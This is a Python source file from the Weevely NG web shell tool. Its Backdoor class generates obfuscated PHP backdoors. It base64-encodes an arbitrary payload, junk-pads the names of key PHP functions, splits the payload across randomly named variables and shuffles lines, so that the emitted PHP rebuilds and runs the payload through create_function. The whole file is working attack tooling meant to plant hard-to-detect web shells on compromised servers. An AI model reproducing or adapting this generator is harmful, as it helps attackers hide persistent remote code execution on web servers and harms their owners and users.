# -*- coding: utf-8 -*-
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

import base64, codecs
from random import random, randrange, choice, shuffle
from pollution import random_string, pollute_with_static_str
from module import ModuleException

class Backdoor:

#	payload_template= """
#phpinfo();
#"""

	backdoor_template = """<?php 
$%%PAY_VAR1%%="%%PAYLOAD1%%";
$%%PAY_VAR2%%="%%PAYLOAD2%%";
$%%PAY_VAR3%%="%%PAYLOAD3%%";
$%%PAY_VAR4%%="%%PAYLOAD4%%";
$%%REPL_FUNC%% = str_replace("%%REPL_POLLUTION%%","","%%REPL_ENCODED%%");
$%%B64_FUNC%% = $%%REPL_FUNC%%("%%B64_POLLUTION%%", "", "%%B64_ENCODED%%");
$%%CREATFUNC%% = $%%REPL_FUNC%%("%%CREATFUNC_POLLUTION%%","","%%CREATFUNC_ENCODED%%");
$%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR1%%.$%%PAY_VAR2%%.$%%PAY_VAR3%%.$%%PAY_VAR4%%))); $%%FINALFUNC%%();
?>"""

	def __init__( self,payload_template):
		
		#if len(password)<4:
			#raise ModuleException('generate','Password \'%s\' too short, choose another one' % password)
		
		#self.password  = password
		#self.start_key = self.password[:2]
		#self.end_key   = self.password[2:]
		self.payload   = payload_template
		self.backdoor  = self.encode_template()

	def __str__( self ):
		return self.backdoor

	def encode_template(self):
		
		b64_new_func_name = random_string()
		b64_pollution, b64_polluted = pollute_with_static_str('base64_decode',frequency=0.7)
		
		createfunc_name = random_string()
		createfunc_pollution, createfunc_polluted = pollute_with_static_str('create_function',frequency=0.7)
		
		payload_var = [ random_string() for st in range(4) ]
		payload_pollution, payload_polluted = pollute_with_static_str(base64.b64encode(self.payload))
		
		replace_new_func_name = random_string()
		repl_pollution, repl_polluted = pollute_with_static_str('str_replace',frequency=0.7)
		
		final_func_name = random_string()
		
		length  = len(payload_polluted)
		offset = 7
		piece1	= length / 4 + randrange(-offset,+offset)
		piece2  = length / 2 + randrange(-offset,+offset)
		piece3  = length*3/4 + randrange(-offset,+offset)
		
		ts_splitted = self.backdoor_template.splitlines()
		ts_shuffled = ts_splitted[1:6]
		shuffle(ts_shuffled)
		ts_splitted = [ts_splitted[0]] + ts_shuffled + ts_splitted[6:]
		self.backdoor_template = '\n'.join(ts_splitted)
		
		template = self.backdoor_template.replace( '%%B64_ENCODED%%', b64_polluted )
		template = template.replace( '%%B64_FUNC%%', b64_new_func_name )
		template = template.replace( '%%CREATFUNC%%', createfunc_name )
		template = template.replace( '%%CREATFUNC_ENCODED%%',  createfunc_polluted )
		template = template.replace( '%%CREATFUNC_POLLUTION%%',  createfunc_pollution )
		template = template.replace( '%%REPL_ENCODED%%',  repl_polluted )
		template = template.replace( '%%REPL_POLLUTION%%',  repl_pollution )
		template = template.replace( '%%REPL_FUNC%%', replace_new_func_name )
		template = template.replace( '%%PAY_VAR1%%', payload_var[0] )
		template = template.replace( '%%PAY_VAR2%%', payload_var[1] )
		template = template.replace( '%%PAY_VAR3%%', payload_var[2] )
		template = template.replace( '%%PAY_VAR4%%', payload_var[3] )
		template = template.replace( '%%PAYLOAD_POLLUTION%%', payload_pollution )
		template = template.replace( '%%B64_POLLUTION%%', b64_pollution )
		template = template.replace( '%%PAYLOAD1%%', payload_polluted[:piece1] )
		template = template.replace( '%%PAYLOAD2%%', payload_polluted[piece1:piece2] )
		template = template.replace( '%%PAYLOAD3%%', payload_polluted[piece2:piece3] )
		template = template.replace( '%%PAYLOAD4%%', payload_polluted[piece3:] )
		template = template.replace( '%%FINALFUNC%%', final_func_name )
		
		
		return template
#test=Backdoor('aaaa','echo "aaa";')
#print test.__str__()

